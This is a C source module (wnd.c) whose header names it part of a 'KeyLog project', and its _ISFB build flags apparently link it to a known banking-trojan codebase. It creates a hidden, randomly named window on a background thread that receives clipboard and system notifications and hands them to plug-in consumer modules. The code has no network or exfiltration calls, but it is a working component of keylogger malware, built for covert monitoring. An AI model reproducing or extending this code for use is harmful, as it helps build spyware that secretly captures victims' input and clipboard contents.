//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: wnd.c
// $Revision: 58 $
// $Date: 2014-12-17 17:44:58 +0300 (Ср, 17 дек 2014) $
// description: 
//	Hidden window that receives system notifications.

#include "..\common\main.h"
#include "..\common\common.h"
#include "..\common\guid.h"
#include "..\handle\handle.h"
#include "wnd.h"

#pragma warning (disable:4244)

typedef struct _NOTIFICATION_WINDOW
{
	// notifier thread
	HANDLE hThreadEvent;
	DWORD  ThreadID;
	HANDLE hThread;
	BOOL   bExit;
	DWORD  Error; // thread result

	// notification window
	TCHAR szWindowClass[GUID_STR_LENGTH+1];
	HWND hWnd;

	// notification contexts
	PNOTIFICATION_CONSUMER Consumer[NOTIFY_MAX+1];
	int nConsumers;

}NOTIFICATION_WINDOW,*PNOTIFICATION_WINDOW;

static NOTIFICATION_WINDOW g_NotificationWindow = {0};

// notification window function
static
LRESULT CALLBACK NWindowProc(
	HWND	hWnd,
	UINT	uMsg,
	WPARAM	wParam,
	LPARAM	lParam
	)
{
	LRESULT lResult = 0;
	BOOL fbHandled = FALSE;
	int i;
	PNOTIFICATION_WINDOW pWindow = 
		(PNOTIFICATION_WINDOW)(LONG_PTR)GetWindowLongPtr(hWnd,GWLP_USERDATA);

	if ( uMsg == WM_CREATE )
	{
		LPCREATESTRUCT lpCreate = (LPCREATESTRUCT)lParam;
		if ( lpCreate ){
			// set context
			pWindow = (PNOTIFICATION_WINDOW)lpCreate->lpCreateParams;
			SetWindowLongPtr(hWnd,GWLP_USERDATA,(LONG_PTR)pWindow);

			// call consumers
			for ( i = 0; i < NOTIFY_MAX; ++i )
			{
				PNOTIFICATION_CONSUMER Consumer = pWindow->Consumer[i];
				if (Consumer)
				{
					if (Consumer->Register)
						Consumer->Register(hWnd,Consumer);
				}
				else
					break;
			}
		}
		return 0;
	}
	else if ( uMsg == WM_DESTROY )
	{
		// call consumers
		for ( i = 0; i < NOTIFY_MAX; ++i )
		{
			PNOTIFICATION_CONSUMER Consumer = pWindow->Consumer[i];
			if ( Consumer )
			{
				if (Consumer->Unregister)
					Consumer->Unregister(hWnd,Consumer);
			}
			else
				break;
		}	// for ( i = 0; i < NOTIFY_MAX; ++i )
		return 0;
	}

	// call consumers
	if (pWindow)
	{
		for ( i = 0; i < NOTIFY_MAX; ++i )
		{
			PNOTIFICATION_CONSUMER Consumer = pWindow->Consumer[i];
			if (Consumer)
			{
				if (Consumer->Handle && Consumer->bActive)
				{
					if (Consumer->Handle(Consumer, hWnd, uMsg, wParam, lParam, &lResult))
						fbHandled = TRUE;
				}
			}	// if (Consumer)
			else
				break;
		}	// for ( i = 0; i < NOTIFY_MAX; ++i )
	}	// if (pWindow)

	// handle message if needed
	if (!fbHandled)
		lResult = DefWindowProc(hWnd, uMsg, wParam, lParam);
	
	return (LRESULT)lResult;
}

// function creates window class
static ATOM NWindowCreateClass ( PNOTIFICATION_WINDOW pWindow )
{
	WNDCLASS wc = {0};
	ULONG NameSeed = GetTickCount();

	// gen random class name
	FillGuidName(&NameSeed,pWindow->szWindowClass);

	// registering windows that will receive 
	// clipboard notifications
	wc.lpfnWndProc   = (WNDPROC)NWindowProc;
	wc.hInstance     = g_CurrentProcessModule;
	wc.lpszClassName = pWindow->szWindowClass;

	return RegisterClass(&wc);
}

// function unregisters window class
static BOOL NWindowDestroy ( PNOTIFICATION_WINDOW pWindow )
{
	BOOL bRet;

	DestroyWindow(pWindow->hWnd);
	bRet = UnregisterClass(pWindow->szWindowClass, g_CurrentProcessModule);

	pWindow->hWnd = 0;
	memset(pWindow->szWindowClass, 0, GUID_STR_LENGTH + 1);

	return(bRet);
}

// creates notifier window
static HWND NWindowCreate( PNOTIFICATION_WINDOW pWindow )
{
	HWND hWnd = NULL;
	if (NWindowCreateClass(pWindow))
		hWnd = CreateWindow(pWindow->szWindowClass, 0, 0, 1, 1, 1, 1, NULL, NULL, g_CurrentProcessModule, pWindow);
	
	return hWnd;
}

// notifier thread that gets all windows messages
static DWORD CALLBACK NWindowThread( PNOTIFICATION_WINDOW pWindow )
{
	WINERROR Status = NO_ERROR;
	int i;

#ifdef _ISFB
	ENTER_WORKER();
#endif

	do
	{
		// call consumers
		for ( i = 0; i < NOTIFY_MAX; ++i )
		{
			PNOTIFICATION_CONSUMER Consumer = pWindow->Consumer[i];
			if ( Consumer )
			{
				if ( Consumer->Register0 )
				{
					Status = Consumer->Register0(Consumer);
					if ( Status != NO_ERROR )
						break;
				}
			}
			else
				break;
		}	// for ( i = 0; i < NOTIFY_MAX; ++i )

		if ( Status != NO_ERROR ){
			DbgPrint("[NWindowThread] Register0 error, %lu\n",Status);
			pWindow->Error = Status;
			break;
		}

		// creating clipboard window
		if (!(pWindow->hWnd = NWindowCreate(pWindow)))
		{
			pWindow->Error = Status = GetLastError();
			DbgPrint("[NWindowThread] failed to create window, err = %lu\n",Status);
		}

		// we are ready
		if (pWindow->hThreadEvent)
			SetEvent( pWindow->hThreadEvent );

		if (Status == NO_ERROR )
		{
			// window message loop
			while (pWindow->bExit == FALSE)
			{
				MSG msg;
				if (!GetMessage(&msg,NULL,0,0))
					break;
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}

			// cleanup
			NWindowDestroy(pWindow);
		}
	}while ( FALSE );

	// call consumers
	for ( i = 0; i < NOTIFY_MAX; ++i )
	{
		PNOTIFICATION_CONSUMER Consumer = pWindow->Consumer[i];
		if (Consumer)
		{
			if (Consumer->Unregister0)
				Consumer->Unregister0(Consumer);
		}
		else
			break;
	}	// for ( i = 0; i < NOTIFY_MAX; ++i )

#ifdef _ISFB
	LEAVE_WORKER();
#endif

	return(Status);
}


//
//	Registers notification consumer
//
LONG NWindowRegister(PNOTIFICATION_CONSUMER Consumer)
{
	PNOTIFICATION_WINDOW pWindow = &g_NotificationWindow;
	int i;
	if ( Consumer == NULL || pWindow->nConsumers >= NOTIFY_MAX ){
		return -1;
	}
	for ( i = 0; i < NOTIFY_MAX; i++ ){
		if ( pWindow->Consumer[i] == Consumer ){
			return -1;
		}
	}
	for ( i = 0; i < NOTIFY_MAX; i++ ){
		if ( pWindow->Consumer[i] == NULL ){
			pWindow->Consumer[i] = Consumer;
			pWindow->nConsumers++;
			return i;
		}
	}
	return -1;
}


//
//	Removes notification consumer
//
VOID NWindowUnregister(PNOTIFICATION_CONSUMER Consumer)
{
	PNOTIFICATION_WINDOW pWindow = &g_NotificationWindow;
	int i,j;
	for ( i = 0; i < NOTIFY_MAX; i++ ){
		if ( pWindow->Consumer[i] == Consumer ){
			pWindow->Consumer[i] = NULL;
			pWindow->nConsumers--;
			break;
		}
	}
	if ( i < NOTIFY_MAX ){
		for ( j = i; j < NOTIFY_MAX-1; j++ ){
			pWindow->Consumer[j] = pWindow->Consumer[j+1];
		}
		pWindow->Consumer[NOTIFY_MAX-1] = NULL;
	}
}


//
// Initializes notification widow structures. Creates notification thread.
//
WINERROR NWindowStart(VOID)
{
	WINERROR Status = NO_ERROR;
	DWORD  dwThreadID = 0;
	PNOTIFICATION_WINDOW pWindow = &g_NotificationWindow;

	pWindow->bExit = FALSE;

	do
	{
		if ( pWindow->nConsumers == 0 ){
			DbgPrint("[NWindowStart] no consumers registered\n");
			break;
		}

		// generating tracker identifier
		if ( pWindow->hThreadEvent != NULL ){
			DbgPrint("[NWindowStart] window thread is running already\n");
			break;
		}

		// thread notification event
		 pWindow->hThreadEvent = CreateEvent ( NULL, TRUE, FALSE, NULL );
		if (  pWindow->hThreadEvent == NULL ){
			Status = GetLastError();
			DbgPrint("[NWindowStart] failed to create event, err = %lu\n",Status);
			break;
		}

		// starting tracker thread
		if (!(pWindow->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NWindowThread, pWindow, 0, &pWindow->ThreadID)))
		{
			Status = GetLastError();
			DbgPrint("[NWindowStart] failed to start thread, err = %lu\n",Status);
			break;
		}

	} while ( FALSE );

	return Status;
}


//
//	Releases notification window. Stops notification thread.
//
VOID NWindowStop(VOID)
{
	PNOTIFICATION_WINDOW pWindow = &g_NotificationWindow;

	// post quit event to worker thread
	pWindow->bExit = TRUE;

	if (pWindow->hThread)
	{
		ASSERT(pWindow->ThreadID);

		PostThreadMessage(pWindow->ThreadID, WM_NULL, 0, 0);
		SwitchToThread();

		// wait for the thread to terminate
#ifndef _ISFB
		WaitForSingleObject( pWindow->hThread, INFINITE );
#endif
		CloseHandle( pWindow->hThread );
		pWindow->hThread  = NULL;
	}	// if (pWindow->hThread)

	if (pWindow->hThreadEvent)
	{
		CloseHandle( pWindow->hThreadEvent );
		pWindow->hThreadEvent = NULL;
	}
}